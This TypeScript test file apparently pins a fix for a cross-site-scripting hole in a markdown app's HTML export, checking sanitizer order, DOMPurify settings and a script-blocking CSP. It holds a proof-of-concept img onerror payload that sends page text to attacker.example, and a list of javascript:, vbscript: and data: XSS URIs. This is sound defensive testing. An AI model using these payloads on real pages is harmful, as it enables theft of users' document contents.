import assert from 'node:assert/strict';
import test from 'node:test';

import { ALLOWED_MARKDOWN_URI_REGEXP, MARKDOWN_SANITIZE_CONFIG } from '../src/lib/utils/sanitize.js';
import { hasMarkdownLinkExtension, MARKDOWN_LINK_EXTENSIONS } from '../src/lib/utils/markdownLinks.js';
import { readSource } from './sourceTree.js';

const exportSource = readSource('src/lib/utils/export.ts');
const sanitizeSource = readSource('src/lib/utils/sanitize.ts');

// The report's proof of concept. A document containing this line renders as
// nothing in the preview (the viewer sanitizes), so the user sees no sign of
// it; the export used to write it to disk verbatim, and the app then offers to
// open that file in the default browser, where the handler runs with no CSP.
const POC = `<img src=x onerror="fetch('https://attacker.example/?'+encodeURIComponent(document.body.innerText))">`;

// DOMPurify itself needs a real DOM, which the Node test runner does not have,
// so these tests exercise the two halves of the policy that are checkable here:
// the URI decision (a pure regexp, applied exactly the way DOMPurify applies it,
// see purify.es.mjs line ~1041) and the configuration that decides what the
// filter may keep. The behavioural half was verified against the real DOMPurify
// build in Chrome: `sanitizeMarkdownHtml(POC)` returns `<img src="x">` — the
// event handler, and with it the whole payload, is gone.
const ATTR_WHITESPACE = /[\u0000-\u0020\u00A0\u1680\u180E\u2000-\u2029\u205F\u3000]/g;

function uriIsAllowed(value: string): boolean {
	return ALLOWED_MARKDOWN_URI_REGEXP.test(value.replace(ATTR_WHITESPACE, ''));
}

test('the export sanitizes the rendered document before it touches it', () => {
	// The regression this pins: `render_markdown` output going into
	// `processMarkdownHtml` — and from there into the file — without passing
	// through the shared filter first. Order matters as much as presence: the
	// sanitizer has to see the untrusted document, not our own generated markup.
	const sanitizeCall = exportSource.indexOf('const safeHtml = sanitizeMarkdownHtml(rendered);');
	const processCall = exportSource.indexOf('processMarkdownHtml(safeHtml, ctx.tabPath, new Set())');

	assert.ok(sanitizeCall !== -1, 'export must sanitize the raw render_markdown output');
	assert.ok(processCall !== -1, 'export must feed the sanitized HTML into processMarkdownHtml');
	assert.ok(sanitizeCall < processCall, 'sanitization must happen before any Markpad-owned processing');

	// The raw renderer output must not reach any other consumer unfiltered.
	assert.doesNotMatch(exportSource, /processMarkdownHtml\(\s*rendered\b/);
	assert.match(exportSource, /import \{ sanitizeMarkdownHtml \} from '\.\/sanitize\.js'/);
});

test('the proof-of-concept payload cannot reach an exported file', () => {
	// The payload's danger is the handler, not the URI: `x` is an ordinary
	// relative path and is meant to stay allowed. So nothing about the URI
	// policy stops this one — two other things do, and both are asserted here,
	// because on the unfixed export path neither was in the way.
	//
	// (`assert.match(POC, /onerror=/)` used to sit here. POC is a template
	// literal three lines above, so the assertion restated the fixture back to
	// itself and no change to `src/` could reach it.)
	assert.equal(uriIsAllowed('x'), true);

	// 1. The renderer output carrying the payload goes through the shared
	//    filter before anything else touches it, and DOMPurify drops `on*`
	//    handlers unless the config hands them back. Nothing in the shared
	//    config does: a future `ADD_ATTR: ['onerror']`, `ALLOWED_ATTR`,
	//    `ADD_TAGS`, `ALLOW_UNKNOWN_PROTOCOLS` or `SANITIZE_DOM: false` would
	//    fail the key assertion below.
	assert.match(exportSource, /const safeHtml = sanitizeMarkdownHtml\(rendered\);/);
	assert.deepEqual(Object.keys(MARKDOWN_SANITIZE_CONFIG).sort(), ['ALLOWED_URI_REGEXP', 'FORBID_TAGS']);
	assert.deepEqual(MARKDOWN_SANITIZE_CONFIG.FORBID_TAGS, ['style']);
	assert.equal(MARKDOWN_SANITIZE_CONFIG.ALLOWED_URI_REGEXP, ALLOWED_MARKDOWN_URI_REGEXP);

	// 2. Even if the filter ever lets something through, the exported document
	//    itself refuses to run it.
	assert.match(exportSource, /<meta http-equiv="Content-Security-Policy"/);
	assert.match(exportSource, /"default-src 'none'"/);
});

test('exported files carry a policy that cannot run script', () => {
	// Second line of defence: verified in Chrome, an exported page with this
	// meta tag runs neither an inline `<script>` nor an `onerror` handler even
	// when the body is left unsanitized, while the copied stylesheet, inline
	// style attributes, embedded data-URI images and remote https images all
	// still work.
	assert.match(exportSource, /<meta http-equiv="Content-Security-Policy" content="\$\{EXPORT_CSP\}">/);
	assert.match(exportSource, /"default-src 'none'"/);
	assert.match(exportSource, /"style-src 'unsafe-inline'"/);
	assert.match(exportSource, /'img-src data: https: http:'/);
	assert.match(exportSource, /'media-src data: https: http:'/);
	// Script execution must never be granted back.
	assert.doesNotMatch(exportSource, /script-src/);
	assert.doesNotMatch(exportSource, /unsafe-eval/);
});

test('dangerous URIs are rejected by the shared policy', () => {
	const rejected = [
		'javascript:alert(1)',
		'JaVaScRiPt:alert(1)',
		// DOMPurify strips whitespace and control characters before testing, so
		// the classic obfuscations collapse onto the same decision.
		'java\tscript:alert(1)',
		' javascript:alert(1)',
		'java\u0000script:alert(1)',
		'data:text/html,<script>alert(1)</script>',
		'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
		'vbscript:msgbox(1)',
	];

	for (const uri of rejected) {
		assert.equal(uriIsAllowed(uri), false, `${uri} must not be an allowed URI`);
	}

	// `data:` on an `<a href>` is rejected above; DOMPurify separately permits
	// `data:` on `<img>`/`<video>`/`<audio>` sources regardless of this regexp
	// (DATA_URI_TAGS), which is what keeps embedded export images working.
	assert.equal(uriIsAllowed('data:image/png;base64,iVBORw0KGgo='), false);
});

test('the link shapes real documents use still pass', () => {
	const allowed = [
		'https://example.com/page?a=b#c',
		'http://example.com/page',
		'ftp://files.example.com/x.txt',
		'mailto:someone@example.com',
		'tel:+15551234567',
		'#section-heading',
		'./notes/other.md',
		'../images/diagram.png',
		'images/pic.png',
		'assets/a b.png',
		// Local images after `convertFileSrc`, in both shapes it emits.
		'asset://localhost/Users/x/notes/pic.png',
		'http://asset.localhost/C%3A%2FDocs%2Fimg%2Fa.png',
		'tauri://localhost/x',
		// A Windows drive path pointing at another markdown document, which the
		// viewer opens as an internal navigation and the export rewrites to .html.
		'C:\\notes\\other.md',
		'D:/notes/other.markdown#heading',
	];

	for (const uri of allowed) {
		assert.equal(uriIsAllowed(uri), true, `${uri} must remain an allowed URI`);
	}
});

test('the sanitizer and the link resolver agree on markdown extensions', () => {
	// The URI pattern splices this list into a regexp, so a divergence would
	// silently make some internal markdown links unclickable.
	for (const ext of MARKDOWN_LINK_EXTENSIONS) {
		assert.equal(hasMarkdownLinkExtension(`note.${ext}`), true, `.${ext} must be a markdown link extension`);
		assert.equal(uriIsAllowed(`C:\\notes\\note.${ext}`), true, `C:\\notes\\note.${ext} must be allowed`);
	}
	assert.equal(hasMarkdownLinkExtension('note.html'), false);
	assert.equal(uriIsAllowed('C:\\notes\\note.exe'), false);
});

test('the shared policy forbids author stylesheets', () => {
	// `<style>` is on DOMPurify's default allowlist and its CSS is not filtered.
	// In the preview the sanitized HTML is injected into the app's own document,
	// so a document author's stylesheet is not scoped to the article: it can
	// hide app chrome or beacon out through `background: url(https://…)`.
	// Verified in Chrome: with the tag forbidden, an author `<style>` block no
	// longer applies, and nothing Markpad renders depends on it.
	assert.ok(MARKDOWN_SANITIZE_CONFIG.FORBID_TAGS.includes('style'));
	// Inline `style` attributes stay allowed on purpose — documents use them
	// and `processMarkdownHtml` sets one on media elements.
	assert.doesNotMatch(sanitizeSource, /FORBID_ATTR/);
});
